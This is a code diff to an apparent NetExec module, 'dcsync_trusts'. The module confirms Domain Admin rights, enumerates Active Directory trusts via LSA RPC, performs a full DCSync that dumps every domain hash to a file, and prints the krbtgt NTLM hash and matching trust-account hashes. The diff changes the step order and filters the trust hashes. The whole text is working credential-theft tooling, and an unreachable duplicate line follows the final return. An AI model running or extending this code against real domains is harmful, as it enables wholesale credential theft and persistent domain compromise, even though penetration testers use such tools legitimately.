@@ -13,10 +13,10 @@ class NXCModule:
     
     This module performs the following functions:
     1. Checks if the authenticated user is a member of the Domain Admins group (RID 512)
-    2. If Domain Admin, performs a full DCSync against the DC and saves to a txt file
-    3. Displays the krbtgt user hash (NTLM) on screen
-    4. Displays hashes of trust accounts (associated domain hashes) if they exist
-    5. Enumerates and displays domain trust relationships via LSA RPC over SMB
+    2. Enumerates domain trust relationships via LSA RPC over SMB
+    3. Performs a full DCSync against the DC and saves to a txt file
+    4. Displays only the krbtgt user hash (NTLM) on screen
+    5. Displays only the hashes of enumerated trust accounts (matching actual trusts)
     
     Requirements:
     - SMB connection with administrative privileges
@@ -28,14 +28,14 @@ class NXCModule:
     Output:
     - Displays whether the user is a Domain Administrator
     - If Domain Admin:
-      - Performs full DCSync and saves to file
-      - Displays krbtgt NTLM hash
-      - Displays trust account hashes
-      - Displays domain trust relationships (via LSA RPC, not LDAP)
+      - Enumerates and displays domain trust relationships (via LSA RPC)
+      - Performs full DCSync and saves all hashes to file
+      - Displays only krbtgt NTLM hash on screen
+      - Displays only trust account hashes that match enumerated trusts
     """
 
     name = "dcsync_trusts"
-    description = "DCSync all hashes, display krbtgt and trust hashes, enumerate domain trusts"
+    description = "DCSync all hashes, display krbtgt and matching trust hashes, enumerate domain trusts"
     supported_protocols = ["smb"]
     category = CATEGORY.ENUMERATION
 
@@ -52,11 +52,11 @@ class NXCModule:
             if is_domain_admin:
                 context.log.success(f"User {connection.username} is a Domain Administrator!")
                 
-                # Perform DCSync and extract hashes
-                self.perform_dcsync(context, connection)
+                # First enumerate domain trusts to get trust names
+                trust_names = self.enumerate_trusts(context, connection)
                 
-                # Enumerate domain trusts
-                self.enumerate_trusts(context, connection)
+                # Perform DCSync and extract hashes (will filter based on trust_names)
+                self.perform_dcsync(context, connection, trust_names)
             else:
                 context.log.fail(f"User {connection.username} is NOT a Domain Administrator")
                 context.log.fail("Domain Admin privileges required for DCSync operations")
@@ -142,7 +142,7 @@ class NXCModule:
             context.log.debug(traceback.format_exc())
             return False
 
-    def perform_dcsync(self, context, connection):
+    def perform_dcsync(self, context, connection, trust_names=None):
         """Perform DCSync and extract all hashes, highlight krbtgt and trust accounts"""
         try:
             context.log.info("Starting DCSync operation...")
@@ -163,6 +163,14 @@ class NXCModule:
             self.trust_hashes = []
             self.all_hashes = []
             
+            # Prepare trust account names to match (convert trust names to account format)
+            trust_account_names = set()
+            if trust_names:
+                for trust_name in trust_names:
+                    # Trust accounts are typically stored as TRUSTNAME$ or trust_name$
+                    trust_account_names.add(f"{trust_name.upper()}$")
+                    trust_account_names.add(f"{trust_name.lower()}$")
+            
             def hash_callback(secret_type, secret):
                 """Callback to capture all hashes and identify special ones"""
                 if secret and ":" in secret:
@@ -179,13 +187,15 @@ class NXCModule:
                             nthash = parts[3]
                             self.krbtgt_hash = f"{username}:{nthash}"
                         
-                        # Check for trust accounts (end with $)
-                        elif username.endswith("$") and not username.lower().endswith("_machineaccount$"):
-                            # Trust accounts typically have specific naming patterns
-                            # They often contain domain names and end with $
-                            lmhash = parts[2]
-                            nthash = parts[3]
-                            self.trust_hashes.append(f"{username}:{nthash}")
+                        # Check for trust accounts - only if they match enumerated trusts
+                        elif username.endswith("$"):
+                            # If we have trust names, only include matching accounts
+                            if trust_account_names:
+                                if username in trust_account_names:
+                                    lmhash = parts[2]
+                                    nthash = parts[3]
+                                    self.trust_hashes.append(f"{username}:{nthash}")
+                            # If no trust names enumerated, don't include any trust hashes
             
             # Perform DCSync with output file
             use_vss_method = False
@@ -244,6 +254,7 @@ class NXCModule:
 
     def enumerate_trusts(self, context, connection):
         """Enumerate domain trust relationships using LSA RPC over SMB"""
+        trust_names = []
         try:
             context.log.info("Enumerating domain trust relationships via LSA RPC...")
             
@@ -254,7 +265,7 @@ class NXCModule:
             except Exception as e:
                 context.log.fail(f"Failed to connect to LSARPC: {e}")
                 context.log.debug(traceback.format_exc())
-                return
+                return trust_names
             
             # Open LSA policy handle
             try:
@@ -263,7 +274,7 @@ class NXCModule:
             except Exception as e:
                 context.log.fail(f"Failed to open LSA policy: {e}")
                 context.log.debug(traceback.format_exc())
-                return
+                return trust_names
             
             # Enumerate trusted domains
             try:
@@ -277,7 +288,7 @@ class NXCModule:
                     lsad.hLsarClose(dce, policy_handle)
                 except Exception:
                     pass
-                return
+                return trust_names
             
             # Parse and display trusts
             trusts_found = 0
@@ -289,6 +300,10 @@ class NXCModule:
                     trust_direction = trust["TrustDirection"]
                     trust_type = trust["TrustType"]
                     trust_attributes = trust["TrustAttributes"]
+                    
+                    # Store trust flat name for hash correlation
+                    if trust_flat_name and trust_flat_name != "Unknown":
+                        trust_names.append(trust_flat_name)
                     
                     # Convert trust direction to text
                     direction_text = {
@@ -349,7 +364,11 @@ class NXCModule:
                 context.log.info("No trust relationships found")
             else:
                 context.log.success(f"Found {trusts_found} trust relationship(s)")
+            
+            return trust_names
                 
         except Exception as e:
             context.log.fail(f"Error enumerating trusts: {e}")
+            context.log.debug(traceback.format_exc())
+            return trust_names
             context.log.debug(traceback.format_exc())
